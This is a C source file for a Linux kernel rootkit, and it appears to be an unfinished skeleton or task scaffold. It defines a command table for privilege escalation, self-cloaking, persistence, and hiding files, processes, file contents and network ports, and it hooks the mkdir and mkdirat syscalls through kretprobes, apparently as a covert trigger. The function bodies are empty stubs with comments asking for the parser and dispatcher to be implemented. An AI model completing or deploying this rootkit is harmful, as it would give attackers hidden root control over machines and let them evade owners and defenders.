// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/kernel.h>
#include <linux/kprobes.h>

/* Command kinds for the dispatch table */
enum rk_cmd {
	CMD_ESCALATE,
	CMD_PID_ESCALATE,
	CMD_CLOAK,
	CMD_UNCLOAK,
	CMD_PERSIST,
	CMD_UNPERSIST,
	CMD_HIDE_FILE,
	CMD_UNHIDE_FILE,
	CMD_HIDE_PID,
	CMD_UNHIDE_PID,
	CMD_HIDE_CONTENT,
	CMD_UNHIDE_CONTENT,
	CMD_HIDE_PORT,
	CMD_UNHIDE_PORT,
	CMD_UNKNOWN,
};

struct rk_cmd_entry {
	const char *prefix;
	int len;
	enum rk_cmd kind;
	bool has_arg;
};

static const struct rk_cmd_entry cmd_table[] = {
    {"e", 1, CMD_ESCALATE, false},
    {"cloak", 5, CMD_CLOAK, false},
    {"uncloak", 7, CMD_UNCLOAK, false},
    {"persist", 7, CMD_PERSIST, false},
    {"unpersist", 9, CMD_UNPERSIST, false},
    {"p.", 2, CMD_PID_ESCALATE, true},
    {"h.f.", 4, CMD_HIDE_FILE, true},
    {"u.f.", 4, CMD_UNHIDE_FILE, true},
    {"h.i.", 4, CMD_HIDE_PID, true},
    {"u.i.", 4, CMD_UNHIDE_PID, true},
    {"h.c.", 4, CMD_HIDE_CONTENT, true},
    {"u.c.", 4, CMD_UNHIDE_CONTENT, true},
    {"h.p.", 4, CMD_HIDE_PORT, true},
    {"u.p.", 4, CMD_UNHIDE_PORT, true},
};

// Implement rk_parse_cmd: walk cmd_table, return the matching enum.
// Implement rk_dispatch: parse, then switch on the command kind.

int rk_dispatch(const char *cmd)
{
	return -ENOENT;
}

static int mkdir_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

static int mkdir_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

struct kretprobe rk_mkdir_probe = {
    .handler = mkdir_return,
    .entry_handler = mkdir_entry,
    .maxactive = 20,
    .kp.symbol_name = "__x64_sys_mkdir",
};

struct kretprobe rk_mkdirat_probe = {
    .handler = mkdir_return,
    .entry_handler = mkdir_entry,
    .maxactive = 20,
    .kp.symbol_name = "__x64_sys_mkdirat",
};
